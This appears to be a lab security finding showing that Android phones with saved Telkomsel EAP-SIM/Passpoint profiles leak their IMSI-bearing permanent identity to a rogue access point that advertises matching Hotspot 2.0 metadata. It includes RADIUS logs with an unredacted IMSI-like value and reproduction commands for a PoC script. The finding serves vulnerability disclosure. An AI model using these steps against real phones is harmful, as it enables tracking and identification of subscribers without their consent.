# Finding: Saved EAP-SIM/Passpoint Profile Triggered By Matching HS2.0 Metadata

## Summary

An Android lab phone with a previously installed/saved EAP-SIM carrier profile can send a permanent EAP-SIM identity to a newly created lab AP when the AP advertises matching Hotspot 2.0 / ANQP metadata.

The original AP does not need to be online. The trigger is the saved client-side credential/profile matching:

- 3GPP PLMN: `510/10`
- NAI realm: `wlan.mnc010.mcc510.3gppnetwork.org`
- EAP methods: SIM / AKA / AKA'

## Observed Evidence

FreeRADIUS received:

```text
User-Name = "1510109562916327@wlan.mnc010.mcc510.3gppnetwork.org"
eap: EAP-Identity reply
eap: Using default_eap_type = SIM
eap_sim: ERROR: EAP-SIM-RAND1 not found
Sent Access-Reject
```

The EAP-SIM permanent identity format is `1 + IMSI`. In this lab evidence:

```text
EAP identity: 1510109562916327@wlan.mnc010.mcc510.3gppnetwork.org
IMSI-like value: 510109562916327
```

## Interpretation

This is not a probe request leak. The identity appears after the phone has matched the HS2.0 metadata and started 802.1X/EAP with the AP/RADIUS stack.

The Access-Reject is expected because the lab FreeRADIUS backend does not have Telkomsel authentication vectors for the subscriber.

## Reproduction

Positive trigger:

```bash
python3 poc.py --mode sim-only-probe --hs20-profile telkomsel-optimized \
  --interface wlx00c0cab75392 --sudo --capture-seconds 180 \
  --confirm-real-phone-lab \
  --confirm-rf-lab \
  --no-redact-identities \
  --output evidence/telkomsel-sim-only-probe.json
```

Negative control:

```bash
python3 poc.py --mode sim-only-probe --hs20-profile negative-control \
  --interface wlx00c0cab75392 --sudo --capture-seconds 120 \
  --confirm-real-phone-lab \
  --confirm-rf-lab \
  --no-redact-identities \
  --output evidence/negative-control-sim-only-probe.json
```

## Expected Validation

- `telkomsel-optimized` may produce `permanent_eap_sim_identity`.
- `negative-control` should not produce Telkomsel EAP identity.
- PCAP/log evidence should be stored under `evidence/`.

## Data Handling

Treat IMSI, pseudonym identities, RADIUS logs, and PCAPs as sensitive lab evidence. Do not commit raw identifiers or unsanitized captures.
